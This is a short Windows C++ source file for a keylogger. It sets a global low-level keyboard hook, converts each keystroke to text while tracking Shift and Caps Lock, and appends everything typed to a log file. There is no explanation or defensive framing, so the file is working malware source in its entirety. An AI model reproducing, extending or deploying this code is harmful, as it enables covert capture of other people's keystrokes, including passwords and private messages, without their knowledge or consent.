#include "stdafx.h"

HHOOK kbdhook;
LogFile logFile(_T(LOGFILE));
LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {	

	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handleKeysProc, GetModuleHandle(NULL), NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return OK;
}


LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
 	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		TCHAR tmp[0xFF] = { 0 };
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lParam);
		bool printable;

		TCHAR str[0xFF] = { 0 };

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);		
		
		if (_tcscmp(tmp, _T("Caps Lock")) == 0) {
			capslock = !capslock;
		} else if (_tcscmp(tmp, _T("Shift")) == 0) {
			shift = true;
		} else {
			if (_tcslen(tmp) > 1) {
				lstrcpy(str, _T("["));
				lstrcat(str, tmp);
				lstrcat(str, _T("]"));
			} else {
				lstrcat(str, tmp);
				if (shift == capslock) { /* Lowercase */
					for (size_t i = 0; i < _tcslen(str); ++i)
						str[i] = tolower(str[i]);
				} else { /* Uppercase */
					for (size_t i = 0; i < _tcslen(str); ++i) {
						if (str[i] >= 'A' && str[i] <= 'Z') {
							str[i] = toupper(str[i]);
						}
					}
				}
				shift = false;
			}

#ifdef _DEBUG	
			OutputDebugString(str);			
#endif // DEBUG

			logFile.Write(str);
		}
	}
	return CallNextHookEx(kbdhook, nCode, wParam, lParam);
}
